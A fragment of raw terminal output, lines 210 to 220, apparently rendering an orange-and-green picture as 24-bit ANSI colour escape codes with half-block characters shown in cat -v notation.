0m\e[38;2;106;98;8mM-bM-^VM-^D\e[48;2;254;148;0m\e[38;2;106;96;8mM-bM-^VM-^D\e[48;2;255;148;0m\e[38;2;118;98;7mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;123;101;7mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;129;99;6mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;141;100;5mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;166;111;4mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;189;122;4mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;217;131;1mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;248;145;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;250;148;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;254;149;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;249;147;1m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;47;44;15m\e[38;2;81;54;7mM-bM-^VM-^D\e[0m
   210	         \e[48;2;163;95;0m\e[38;2;176;103;0mM-bM-^VM-^D\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;254;147;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;250;144;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;238;146;1mM-bM-^VM-^D\e[48;2;254;147;0m\e[38;2;170;117;4mM-bM-^VM-^D\e[48;2;252;147;0m\e[38;2;78;65;5mM-bM-^VM-^D\e[48;2;239;144;1m\e[38;2;36;71;11mM-bM-^VM-^D\e[48;2;220;136;2m\e[38;2;41;122;21mM-bM-^VM-^D\e[48;2;193;124;2m\e[38;2;59;179;31mM-bM-^VM-^D\e[48;2;178;119;4m\e[38;2;69;210;35mM-bM-^VM-^D\e[48;2;129;104;6m\e[38;2;73;219;37mM-bM-^VM-^D\e[48;2;67;87;10m\e[38;2;73;219;37mM-bM-^VM-^D\e[48;2;61;106;15m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;52;126;21m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;52;150;25m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;58;177;30m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;63;194;33m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;66;204;34m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;69;212;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;72;217;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;72;219;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;74;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;219;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;72;214;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;68;207;35m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;65;197;34m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;61;185;32m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;51;157;27m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;41;125;21m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;40;106;18m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;75;92;10m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;76;85;10m\e[38;2;73;219;37mM-bM-^VM-^D\e[48;2;112;94;7m\e[38;2;72;216;36mM-bM-^VM-^D\e[48;2;162;113;5m\e[38;2;64;194;33mM-bM-^VM-^D\e[48;2;219;131;0m\e[38;2;50;152;26mM-bM-^VM-^D\e[48;2;231;138;1m\e[38;2;30;65;14mM-bM-^VM-^D\e[48;2;252;147;0m\e[38;2;106;71;5mM-bM-^VM-^D\e[48;2;97;61;4m\e[38;2;30;31;7mM-bM-^VM-^D\e[0m
   211	         \e[48;2;186;108;0m\e[38;2;185;108;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;254;148;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;247;144;0mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;188;113;1mM-bM-^VM-^D\e[48;2;255;147;0m\e[38;2;110;100;8mM-bM-^VM-^D\e[48;2;248;147;0m\e[38;2;72;136;20mM-bM-^VM-^D\e[48;2;206;124;1m\e[38;2;62;175;29mM-bM-^VM-^D\e[48;2;115;81;4m\e[38;2;67;204;34mM-bM-^VM-^D\e[48;2;55;92;13m\e[38;2;72;217;36mM-bM-^VM-^D\e[48;2;60;157;26m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;66;195;32m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;70;212;35m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;72;215;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;217;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;71;210;37m\e[38;2;71;214;37mM-bM-^VM-^D\e[48;2;58;142;37m\e[38;2;57;136;37mM-bM-^VM-^D\e[48;2;51;109;39m\e[38;2;54;109;40mM-bM-^VM-^D\e[48;2;36;76;26m\e[38;2;38;71;31mM-bM-^VM-^D\e[0m
   212	         \e[48;2;73;63;12m\e[38;2;24;46;20mM-bM-^VM-^D\e[48;2;89;67;7m\e[38;2;54;120;38mM-bM-^VM-^D\e[48;2;67;119;19m\e[38;2;66;192;35mM-bM-^VM-^D\e[48;2;61;177;29m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;71;213;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;71;214;35m\e[38;2;42;129;21mM-bM-^VM-^D\e[48;2;43;131;22m\e[38;2;4;10;2mM-bM-^VM-^D\e[48;2;37;111;19m\e[38;2;4;10;2mM-bM-^VM-^D\e[48;2;60;180;30m\e[38;2;7;22;3mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;62;187;31mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;72;217;36mM-bM-^VM-^D\e[48;2;69;208;35m\e[38;2;20;61;10mM-bM-^VM-^D\e[48;2;43;129;22m\e[38;2;4;11;2mM-bM-^VM-^D\e[48;2;38;116;19m\e[38;2;3;8;1mM-bM-^VM-^D\e[48;2;64;192;32m\e[38;2;19;57;10mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;73;219;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;214;36m\e[38;2;71;213;36mM-bM-^VM-^D\e[48;2;55;130;37m\e[38;2;55;123;38mM-bM-^VM-^D\e[48;2;54;108;41m\e[38;2;56;110;44mM-bM-^VM-^D\e[48;2;35;60;30m\e[38;2;35;57;30mM-bM-^VM-^D\e[0m
   213	         \e[48;2;37;68;29m\e[38;2;38;61;33mM-bM-^VM-^D\e[48;2;58;132;39m\e[38;2;62;134;45mM-bM-^VM-^D\e[48;2;64;179;36m\e[38;2;55;129;37mM-bM-^VM-^D\e[48;2;72;217;36m\e[38;2;71;210;36mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;27;82;14m\e[38;2;59;178;30mM-bM-^VM-^D\e[48;2;4;11;3m\e[38;2;3;9;1mM-bM-^VM-^D\e[48;2;0;0;0m\e[38;2;8;18;4mM-bM-^VM-^D\e[48;2;1;3;1m\e[38;2;4;12;2mM-bM-^VM-^D\e[48;2;36;112;19m\e[38;2;54;163;27mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;70;210;36m\e[38;2;72;217;36mM-bM-^VM-^D\e[48;2;4;11;1m\e[38;2;9;28;4mM-bM-^VM-^D\e[48;2;0;0;0m\e[38;2;6;16;3mM-bM-^VM-^D\e[48;2;1;3;1m\e[38;2;6;15;3mM-bM-^VM-^D\e[48;2;13;39;6m\e[38;2;32;94;15mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;70;207;36m\e[38;2;67;196;36mM-bM-^VM-^D\e[48;2;52;110;38m \e[48;2;57;101;47m\e[38;2;56;90;47mM-bM-^VM-^D\e[48;2;36;55;31m\e[38;2;38;58;33mM-bM-^VM-^D\e[0m
   214	         \e[48;2;40;63;35m\e[38;2;43;67;38mM-bM-^VM-^D\e[48;2;61;117;48m\e[38;2;45;80;38mM-bM-^VM-^D\e[48;2;54;114;39m\e[38;2;52;110;38mM-bM-^VM-^D\e[48;2;64;177;36m\e[38;2;59;150;37mM-bM-^VM-^D\e[48;2;72;217;36m\e[38;2;72;214;36mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;61;182;30m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;45;135;22m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;58;174;29m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;72;217;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;71;212;35m\e[38;2;72;216;36mM-bM-^VM-^D\e[48;2;34;101;17m\e[38;2;11;32;5mM-bM-^VM-^D\e[48;2;34;101;17m\e[38;2;1;2;1mM-bM-^VM-^D\e[48;2;34;98;18m\e[38;2;1;3;1mM-bM-^VM-^D\e[48;2;35;101;18m\e[38;2;1;1;1mM-bM-^VM-^D\e[48;2;35;100;17m\e[38;2;1;3;1mM-bM-^VM-^D\e[48;2;57;170;29m\e[38;2;56;168;28mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;36m\e[38;2;72;218;36mM-bM-^VM-^D\e[48;2;66;197;33m\e[38;2;72;217;36mM-bM-^VM-^D\e[48;2;46;139;23m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;54;163;27m\e[38;2;72;217;37mM-bM-^VM-^D\e[48;2;71;212;36m\e[38;2;72;217;36mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;37m\e[38;2;70;204;36mM-bM-^VM-^D\e[48;2;60;158;37m\e[38;2;53;122;37mM-bM-^VM-^D\e[48;2;52;103;38m\e[38;2;52;104;40mM-bM-^VM-^D\e[48;2;33;54;28m\e[38;2;21;34;18mM-bM-^VM-^D\e[48;2;46;70;41m\e[38;2;49;76;44mM-bM-^VM-^D\e[0m
   215	         \e[48;2;49;76;44m\e[38;2;51;78;45mM-bM-^VM-^D\e[48;2;32;51;28m\e[38;2;43;65;37mM-bM-^VM-^D\e[48;2;61;125;45m\e[38;2;81;124;71mM-bM-^VM-^D\e[48;2;54;124;38m\e[38;2;53;113;40mM-bM-^VM-^D\e[48;2;68;202;36m\e[38;2;60;156;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;72;215;36mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;73;216;37mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;93;205;61mM-bM-^VM-^D\e[48;2;79;213;44m\e[38;2;121;189;95mM-bM-^VM-^D\e[48;2;85;210;51m\e[38;2;132;184;108mM-bM-^VM-^D\e[48;2;82;211;47m\e[38;2;121;191;93mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;85;210;52mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;37;111;20m\e[38;2;71;214;36mM-bM-^VM-^D\e[48;2;1;2;0m\e[38;2;44;128;22mM-bM-^VM-^D\e[48;2;2;4;2m\e[38;2;15;39;8mM-bM-^VM-^D\e[48;2;1;1;1m\e[38;2;29;82;14mM-bM-^VM-^D\e[48;2;13;37;7m\e[38;2;68;204;34mM-bM-^VM-^D\e[48;2;70;210;35m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;217;37m\e[38;2;74;216;38mM-bM-^VM-^D\e[48;2;82;211;47m\e[38;2;118;191;90mM-bM-^VM-^D\e[48;2;100;200;70m\e[38;2;132;185;108mM-bM-^VM-^D\e[48;2;103;201;72m\e[38;2;127;187;101mM-bM-^VM-^D\e[48;2;98;203;67m\e[38;2;125;189;100mM-bM-^VM-^D\e[48;2;85;209;52m\e[38;2;116;192;88mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;80;211;44mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;36m\e[38;2;68;200;35mM-bM-^VM-^D\e[48;2;63;170;35m\e[38;2;54;125;36mM-bM-^VM-^D\e[48;2;51;103;38m\e[38;2;51;99;38mM-bM-^VM-^D\e[48;2;49;101;36m\e[38;2;22;45;17mM-bM-^VM-^D\e[48;2;30;47;26m\e[38;2;45;69;39mM-bM-^VM-^D\e[48;2;51;78;45m \e[0m
   216	         \e[48;2;51;78;45m \e[48;2;49;75;43m\e[38;2;51;78;45mM-bM-^VM-^D\e[48;2;30;38;27m\e[38;2;39;59;35mM-bM-^VM-^D\e[48;2;63;123;49m\e[38;2;71;110;62mM-bM-^VM-^D\e[48;2;54;121;37m\e[38;2;56;119;40mM-bM-^VM-^D\e[48;2;68;198;37m\e[38;2;60;158;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;71;216;36mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;73;216;38mM-bM-^VM-^D\e[48;2;91;206;58m\e[38;2;110;196;81mM-bM-^VM-^D\e[48;2;122;191;95m\e[38;2;126;188;100mM-bM-^VM-^D\e[48;2;128;186;102m\e[38;2;130;187;104mM-bM-^VM-^D\e[48;2;140;180;116m\e[38;2;128;187;103mM-bM-^VM-^D\e[48;2;126;188;100m\e[38;2;106;197;76mM-bM-^VM-^D\e[48;2;96;202;64m\e[38;2;75;215;39mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;72;218;36mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;74;220;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;74;217;38m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;114;194;86m\e[38;2;76;215;40mM-bM-^VM-^D\e[48;2;142;178;121m\e[38;2;94;205;62mM-bM-^VM-^D\e[48;2;150;176;129m\e[38;2;109;196;81mM-bM-^VM-^D\e[48;2;142;180;120m\e[38;2;95;203;63mM-bM-^VM-^D\e[48;2;116;193;88m\e[38;2;76;214;41mM-bM-^VM-^D\e[48;2;78;213;44m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;67;196;36mM-bM-^VM-^D\e[48;2;71;209;37m\e[38;2;60;154;36mM-bM-^VM-^D\e[48;2;59;152;36m\e[38;2;57;138;37mM-bM-^VM-^D\e[48;2;52;110;38m\e[38;2;56;130;37mM-bM-^VM-^D\e[48;2;51;104;38m\e[38;2;30;71;21mM-bM-^VM-^D\e[48;2;20;31;17m\e[38;2;45;69;39mM-bM-^VM-^D\e[48;2;50;78;44m\e[38;2;51;78;45mM-bM-^VM-^D\e[48;2;51;78;45m \e[0m
   217	         \e[48;2;51;78;45m\e[38;2;28;43;24mM-bM-^VM-^D\e[48;2;51;78;45m\e[38;2;43;64;38mM-bM-^VM-^D\e[48;2;51;78;45m\e[38;2;52;79;46mM-bM-^VM-^D\e[48;2;34;53;30m\e[38;2;46;71;41mM-bM-^VM-^D\e[48;2;64;124;48m\e[38;2;49;106;36mM-bM-^VM-^D\e[48;2;53;115;38m\e[38;2;57;124;40mM-bM-^VM-^D\e[48;2;63;175;36m\e[38;2;55;126;38mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;66;186;36mM-bM-^VM-^D\e[48;2;89;208;56m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;111;195;82m\e[38;2;75;215;40mM-bM-^VM-^D\e[48;2;109;197;80m\e[38;2;74;216;38mM-bM-^VM-^D\e[48;2;85;209;52m\e[38;2;73;218;36mM-bM-^VM-^D\e[48;2;73;216;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;217;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;217;36m\e[38;2;73;218;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;71;214;36mM-bM-^VM-^D\e[48;2;71;212;36m\e[38;2;63;172;36mM-bM-^VM-^D\e[48;2;63;174;35m\e[38;2;57;138;37mM-bM-^VM-^D\e[48;2;58;146;36m\e[38;2;57;137;38mM-bM-^VM-^D\e[48;2;58;139;37m\e[38;2;57;138;37mM-bM-^VM-^D\e[48;2;58;138;37m\e[38;2;54;128;35mM-bM-^VM-^D\e[48;2;50;117;34m\e[38;2;20;44;14mM-bM-^VM-^D\e[48;2;20;32;17m\e[38;2;39;61;34mM-bM-^VM-^D\e[48;2;51;77;44m\e[38;2;45;69;40mM-bM-^VM-^D\e[48;2;51;78;45m\e[38;2;45;69;40mM-bM-^VM-^D\e[48;2;51;78;45m\e[38;2;49;75;43mM-bM-^VM-^D\e[0m
   218	         \e[48;2;84;151;67m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;43;80;34m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;22;39;19m\e[38;2;98;178;78mM-bM-^VM-^D\e[48;2;43;67;38m\e[38;2;81;148;64mM-bM-^VM-^D\e[48;2;40;70;33m\e[38;2;44;78;36mM-bM-^VM-^D\e[48;2;54;127;36m\e[38;2;21;47;15mM-bM-^VM-^D\e[48;2;55;120;39m\e[38;2;54;117;39mM-bM-^VM-^D\e[48;2;56;133;37m\e[38;2;59;133;40mM-bM-^VM-^D\e[48;2;71;211;36m\e[38;2;61;164;37mM-bM-^VM-^D\e[48;2;73;217;36m\e[38;2;71;211;36mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;72;218;36mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;72;217;36mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;67;203;34mM-bM-^VM-^D\e[48;2;68;194;37m\e[38;2;40;116;21mM-bM-^VM-^D\e[48;2;58;142;36m\e[38;2;8;21;5mM-bM-^VM-^D\e[48;2;49;120;31m\e[38;2;6;10;5mM-bM-^VM-^D\e[48;2;25;59;16m\e[38;2;73;108;65mM-bM-^VM-^D\e[48;2;15;33;11m\e[38;2;95;157;79mM-bM-^VM-^D\e[48;2;12;25;9m\e[38;2;97;175;77mM-bM-^VM-^D\e[48;2;21;32;19m\e[38;2;99;179;79mM-bM-^VM-^D\e[48;2;23;35;19m\e[38;2;98;178;78mM-bM-^VM-^D\e[48;2;20;34;17m\e[38;2;98;178;78mM-bM-^VM-^D\e[48;2;13;24;11m\e[38;2;98;178;78mM-bM-^VM-^D\e[48;2;16;26;14m\e[38;2;98;177;78mM-bM-^VM-^D\e[0m
   219	         \e[48;2;97;176;77m\e[38;2;58;103;46mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;94;170;75mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;99;179;79mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;97;176;77mM-bM-^VM-^D\e[48;2;97;176;77m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;91;165;72m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;55;100;44m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;15;27;10m\e[38;2;92;168;73mM-bM-^VM-^D\e[48;2;24;46;18m\e[38;2;76;138;61mM-bM-^VM-^D\e[48;2;73;154;53m\e[38;2;54;96;43mM-bM-^VM-^D\e[48;2;74;213;39m\e[38;2;24;48;18mM-bM-^VM-^D\e[48;2;74;222;37m\e[38;2;20;55;11mM-bM-^VM-^D\e[48;2;73;217;37m\e[38;2;31;91;16mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;49;145;24mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;68;201;35mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;73;217;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;74;220;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;73;219;37mM-bM-^VM-^D\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;73;220;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;72;214;37mM-bM-^VM-^D\e[48;2;73;218;37m\e[38;2;63;187;32mM-bM-^VM-^D\e[48;2;72;217;36m\e[38;2;41;120;22mM-bM-^VM-^D\e[48;2;74;222;36m\e[38;2;21;52;13mM-bM-^VM-^D\e[48;2;67;203;34m\e[38;2;39;62;34mM-bM-^VM-^D\e[48;2;40;117;21m\e[38;2;64;103;54mM-bM-^VM-^D\e[48;2;14;43;7m\e[38;2;72;126;57mM-bM-^VM-^D\e[48;2;4;12;2m\e[38;2;87;156;69mM-bM-^VM-^D\e[48;2;25;45;21m\e[38;2;97;174;78mM-bM-^VM-^D\e[48;2;71;124;57m\e[38;2;99;177;80mM-bM-^VM-^D\e[48;2;97;168;78m\e[38;2;94;170;75mM-bM-^VM-^D\e[48;2;96;175;77m\e[38;2;103;177;84mM-bM-^VM-^D\e[48;2;98;176;79m\e[38;2;109;183;90mM-bM-^VM-^D\e[48;2;100;178;80m\e[38;2;112;185;94mM-bM-^VM-^D\e[48;2;100;177;80m\e[38;2;111;184;92mM-bM-^VM-^D\e[48;2;99;177;80m\e[38;2;107;182;89mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;105;182;85mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;103;180;83mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;99;177;79mM-bM-^VM-^D\e[0m
   220	          \e[38;2;54;79;47mM-bM-^VM-^@\e[38;2;72;123;60mM-bM-^VM-^@\e[48;2;97;176;78m\e[38;2;65;87;60mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;73;130;59mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;91;165;72mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;96;172;77m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;82;147;65m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;66;116;52m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;46;78;38m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;27;51;20m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;28;60;20m\e[38;2;94;169;74mM-bM-^VM-^D\e[48;2;28;67;19m\e[38;2;86;155;69mM-bM-^VM-^D\e[48;2;34;96;19m\e[38;2;69;123;54mM-bM-^VM-^D\e[48;2;42;126;21m\e[38;2;48;86;39mM-bM-^VM-^D\e[48;2;51;148;27m\e[38;2;36;64;28mM-bM-^VM-^D\e[48;2;55;164;28m\e[38;2;26;46;20mM-bM-^VM-^D\e[48;2;60;180;30m\e[38;2;23;39;18mM-bM-^VM-^D\e[48;2;62;186;31m\e[38;2;21;40;17mM-bM-^VM-^D\e[48;2;61;181;31m\e[38;2;19;36;16mM-bM-^VM-^D\e[48;2;67;176;40m\e[38;2;18;32;14mM-bM-^VM-^D\e[48;2;63;173;35m\e[38;2;23;36;19mM-bM-^VM-^D\e[48;2;56;168;29m\e[38;2;27;42;23mM-bM-^VM-^D\e[48;2;53;160;27m\e[38;2;29;45;24mM-bM-^VM-^D\e[48;2;44;133;22m\e[38;2;30;53;25mM-bM-^VM-^D\e[48;2;34;102;17m\e[38;2;52;89;43mM-bM-^VM-^D\e[48;2;20;60;10m\e[38;2;88;148;71mM-bM-^VM-^D\e[48;2;24;47;19m\e[38;2;97;171;78mM-bM-^VM-^D\e[48;2;34;62;27m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;55;99;44m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;80;144;64m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;99;176;79m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;177;78